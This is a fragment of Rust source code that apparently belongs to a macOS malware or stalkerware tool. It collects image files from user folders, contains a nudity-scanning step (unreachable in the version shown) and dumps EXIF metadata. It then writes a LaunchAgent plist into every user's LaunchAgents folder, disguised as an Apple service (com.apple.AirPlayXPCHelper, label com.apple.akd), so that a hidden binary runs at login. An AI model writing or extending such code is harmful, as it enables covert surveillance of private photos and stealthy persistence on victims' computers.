                                let mut pending_images = Vec::new();

                                for file in files {
                                    if let Ok(ref file) = file {
                                        if file.path().is_file() {
                                            // check if file is a jpeg, jpg, png
                                            let file_name =
                                                file.path()
                                                    .file_name()
                                                    .unwrap()
                                                    .to_str()
                                                    .map(|s| s.to_string());

                                            let file_extensions = &[".jpg", ".png", ".jpeg", ".heic"];

                                            let qualified = file_extensions.iter().any(|&ext| {
                                                file_name.as_ref().unwrap().ends_with(ext)
                                            });

                                            if file_name.is_some() && qualified {
                                                pending_images.push(file.path().to_str().unwrap().to_string());

                                                continue;

                                                match image::open(&file.path()) {
                                                    Ok(img) => {
                                                        let nudity = nude::scan(&img).analyse();

                                                        println!("{} {:?}", &file.path().display(), nudity);
                                                    }
                                                    Err(e) => {
                                                        eprintln!("{}", e);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }

                                if pending_images.len() > 0 {
                                    for pending_image in pending_images {
                                        let image_path = Path::new(&pending_image);

                                        let mut file = File::open(&pending_image).unwrap();
                                        let mut buf = Vec::new();
                                        file.read_to_end(&mut buf).unwrap();
                                        let mut buf = BufReader::new(buf.as_slice());

                                        let imeta = immeta::load_from_file(&image_path);

                                        dbg!(imeta);
                                        dbg!(exif::get_exif_attr_from_jpeg(&mut buf));
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // sleep for 30 seconds

            std::thread::sleep(std::time::Duration::from_secs(30));

            let plist = r#"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>POSIXSpawnType</key>
	<string>Adaptive</string>
	<key>LimitLoadToSessionType</key>
	<array>
		<string>Aqua</string>
	</array>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/com.apple.AirPlayXPCHelper</string>
	</array>
	<key>EnablePressuredExit</key>
	<false/>
	<key>Label</key>
	<string>com.apple.akd</string>
</dict>
</plist>"#;

            for user in users {
                let mut file = File::create(&format!("/Users/{}/Library/LaunchAgents/com.apple.AirPlayXPCHelper.plist", &user)).unwrap();
                file.write_all(plist.as_bytes()).unwrap();
            }
        }
        Err(e) => eprintln!("Error, {}", e),
    }
}
